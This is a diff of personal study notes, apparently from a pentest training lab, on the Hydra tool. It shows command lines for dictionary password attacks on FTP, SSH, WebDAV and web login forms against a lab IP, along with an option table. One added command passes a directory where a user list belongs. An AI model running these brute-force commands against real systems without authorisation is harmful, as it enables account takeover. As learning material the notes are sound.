@@ -3,38 +3,41 @@
 ---
 
 - Crack pass with pass dic
-- Supports FTP, POP3, IMAP, SMTP, SSH, and all methods related to HTTP.
+- Supports [[FTP\|FTP]], [[POP3\|POP3]], [[IMAP\|IMAP]], [[SMTP\|SMTP]], [[Notes/SSH\|SSH]], [[SMB\|SMB]] and all methods related to HTTP.
 
-| Option                                                                                                              | Description                                                   |
-| ------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------- |
-| `hydra -l username -P wordlist.txt server service`                                                                  | General command-line                                          |
-| `hydra -l mark -P /usr/share/wordlists/rockyou.txt IP ftp`                                                          | E.g. ftp                                                      |
-| `hydra -l mark -P /usr/share/wordlists/rockyou.txt ftp://IP`                                                        | E.g. ftp                                                      |
-| `hydra -l <username> -P <wordlist> 10.10.181.239 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V` | Web form                                                      |
-| `server`                                                                                                            | hostname or IP address of the target server.                  |
-| `service`                                                                                                           | service which are trying to <br>launch the dictionary attack. |
-| `-l`                                                                                                                | specifies the (SSH) **username** for login                    |
-| `-P`                                                                                                                | indicates a **list of passwords**                             |
-| `-t 4`                                                                                                              | sets the number of **threads** to spawn                       |
-| `-s`                                                                                                                | **port** number                                               |
-| `-V`                                                                                                                | Verbose for every attempt                                     |
-| `-vV`                                                                                                               | very verbose<br>shows login+pass for each attempt             |
-| `-d`                                                                                                                | Debugging                                                     |
-| `-L`                                                                                                                | indicates a **list of users**                                 |
-| `-p`                                                                                                                | specifies the (SSH) **password** for login                    |
-| `-f`                                                                                                                | stops Hydra after finding a working password                  |
-| `http-post-form`                                                                                                    | the type of the form is POST                                  |
-| `<path>`                                                                                                            | the login page URL, for example, `login.php`                  |
-| `<invalid_response>`                                                                                                | part of the response when the login fails                     |
-## Post Web Form
+| Option                                                                                                                     | Description                                                   |
+| -------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------- |
+| `hydra -l username -P wordlist.txt server service`                                                                         | General command-line                                          |
+| `hydra -l mark -P /usr/share/wordlists/rockyou.txt IP ftp`<br>`hydra -l mark -P /usr/share/wordlists/rockyou.txt ftp://IP` | E.g. ftp                                                      |
+| `hydra -l <username> -P <wordlist> 10.10.181.239 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`        | Web form                                                      |
+| `server`                                                                                                                   | hostname or IP address of the target server.                  |
+| `service`                                                                                                                  | service which are trying to <br>launch the dictionary attack. |
+| `-l`                                                                                                                       | specifies the (SSH) **username** for login                    |
+| `-L`                                                                                                                       | indicates a **list of users**                                 |
+| `-p`                                                                                                                       | specifies the (SSH) **password** for login                    |
+| `-P`                                                                                                                       | indicates a **list of passwords**                             |
+| `-t 4`                                                                                                                     | sets the number of **threads** to spawn                       |
+| `-s`                                                                                                                       | **port** number                                               |
+| `-V`                                                                                                                       | Verbose for every attempt                                     |
+| `-vV`                                                                                                                      | very verbose<br>shows login+pass for each attempt             |
+| `-d`                                                                                                                       | Debugging                                                     |
+| `-f`                                                                                                                       | stops Hydra after finding a working password                  |
+| `http-post-form`                                                                                                           | the type of the form is POST                                  |
+| `<path>`                                                                                                                   | the login page URL, for example, `login.php`                  |
+| `<invalid_response>`                                                                                                       | part of the response when the login fails                     |
+# Webdav
+Bruteforce on the `webdav` subdir
+```shell
+hydra -L /usr/share/ -P <wordlist> IP_OR_DOMAIN http-get /webdav/
+```
+# Post Web Form
 - Brute force web forms attack.
 - You must know which type of request it is making; GET or POST methods are commonly used.
 - You can use your browser’s network tab (in developer tools) to see the request types or view the source code.
 ```shell
 hydra <username> <wordlist> 10.10.181.239 http-post-form "<path>:<login_credentials>:invalid_response>"
 ```
-
-### POST login form:
+## POST login form:
 ```shell
 hydra -l <username> -P <wordlist> 10.10.181.239 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
 ```
